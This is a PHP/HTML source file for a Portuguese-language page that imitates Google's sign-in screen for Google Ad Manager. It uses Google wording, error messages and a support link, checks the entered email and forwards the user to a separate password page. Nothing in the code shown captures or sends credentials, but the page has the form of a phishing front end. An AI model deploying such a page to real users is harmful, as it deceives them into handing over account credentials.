<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css.php">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css" />
    <title>Login</title>
</head>

<body>
    <?php
    // define variables and set to empty values
    $emailErr = "";
    $email = "";
    $emailClass = "";

    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        if (empty($_POST["email"])) {
            $emailClass = "errorClass";
            $emailErr = "<i class='bi bi-exclamation-circle-fill'></i> Digite um e-mail ou número de telefone";
        } else {
            $email = test_input($_POST["email"]);
            // check if e-mail address is well-formed
            if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
                $emailClass = "errorClass";
                $emailErr = "<i class='bi bi-exclamation-circle-fill'></i> Não foi possível encontrar sua conta Google";
            } else {
                header('Location:login-senha.php');
            }
        }
    }

    function test_input($data)
    {
        $data = trim($data);
        $data = stripslashes($data);
        $data = htmlspecialchars($data);
        return $data;
    }
    ?>


    <section class="login-section">
        <div class="size-box shadow-none ps-5 pe-5 pb-5 pt-2 mb-5 bg-body-light rounded border ">
            <form method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>">
                <div class="text-center">
                    <img src="./images/logo.svg" class="img-login img-fluid" alt="logo">
                </div>

                <p class="login-titulo text-center mb-1">Fazer login</p>
                <p class="text-center subtitle-form">
                    Prosseguir para o Google Ad Manager.
                </p>

                <div class="mb-3 mt-4 input-group-lg">
                    <input type="text" class="form-control <?php echo $emailClass ?>" name="email" id="exampleInputEmail1" placeholder="E-mail ou telefone" aria-describedby="emailHelp">
                    <small class="error"> <?php echo  $emailErr; ?></small>
                </div>
                <a class="esqueceu-email primary mt-1">Esqueceu seu e-mail?</a>

                <div class="mb-3 mt-5">
                    <p class="saiba-mais-container">Não está no seu computador? Use uma janela de navegação privada para fazer login.
                        <a href="https://support.google.com/accounts/answer/2917834">Saiba mais</a>
                    </p>
                </div>
                <div class=" flex-btns d-flex justify-content-between mt-5">
                    <button type="button" class="create btn btn-link">Criar conta</button>
                    <button type="submit" class="btn btn-primary" name="submit" value="Submit">Avançar</button>
                </div>
            </form>

        </div>
    </section>

</body>

</html>